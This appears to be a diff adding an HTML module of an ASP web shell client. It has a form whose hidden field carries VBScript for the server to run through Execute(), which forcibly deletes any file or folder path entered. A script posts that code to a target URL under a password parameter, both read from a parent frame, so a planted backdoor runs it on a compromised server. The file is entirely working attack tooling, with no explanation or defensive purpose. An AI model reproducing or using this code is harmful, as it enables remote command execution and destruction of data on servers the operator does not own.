@@ -1,0 +1,18 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Delete<br>
+Notice: Del dir , you shall input <b>f:\test\</b></div>
+<form name="xform" method="post" target="_blank">
+Path: 
+  <input name="path" type="text" value="f:\test.txt" size="50">
+<input type="hidden" name="code" value='Execute("response.clear:thePath=request(""path""):Set FSOX=CreateObject(""Scripting.FileSystemObject""):If Right(thePath, 1)=""\"" Then:thePath=Left(thePath, Len(thePath) - 1):Call fsoX.DeleteFolder(thePath, True):Else:Call fsoX.DeleteFile(thePath, True):End If:Response.write(""Delete <b>""&thePath&""</b> Success!""):Response.End")'>
+</form>
+<script>
+function RUNonclick(){
+if(confirm("Delete it ?")){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+return true;}
+else{return false;}
+}
+</script>
